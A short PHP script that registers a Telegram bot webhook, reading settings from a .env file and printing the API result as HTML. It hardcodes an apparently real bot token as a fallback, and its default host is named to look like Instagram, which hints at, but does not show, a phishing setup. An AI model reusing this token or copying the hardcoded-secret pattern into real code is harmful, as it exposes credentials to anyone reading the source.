<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$base_url = getenv('BASE_URL') ?: "https://instagram-www.up.railway.app";

if (empty($base_url)) {
    die("❌ Error: BASE_URL environment variable not set!\n\nSet it in Railway Variables or .env file.\n\nExample: BASE_URL=https://your-app.railway.app");
}

$webhook_url = $base_url . "/bot.php";

// Set webhook
$url = "https://api.telegram.org/bot{$telegram_bot_token}/setWebhook?url=" . urlencode($webhook_url);

$response = file_get_contents($url);
$result = json_decode($response, true);

echo "<h2>Telegram Webhook Setup</h2>";
echo "<pre>";
print_r($result);
echo "</pre>";

if ($result['ok']) {
    echo "<p style='color: green; font-size: 18px;'>✅ Webhook set successfully!</p>";
    echo "<p>Webhook URL: <code>{$webhook_url}</code></p>";
    echo "<p>Now send /start to your bot on Telegram!</p>";
} else {
    echo "<p style='color: red;'>❌ Failed to set webhook</p>";
    echo "<p>Error: " . ($result['description'] ?? 'Unknown error') . "</p>";
}

?>
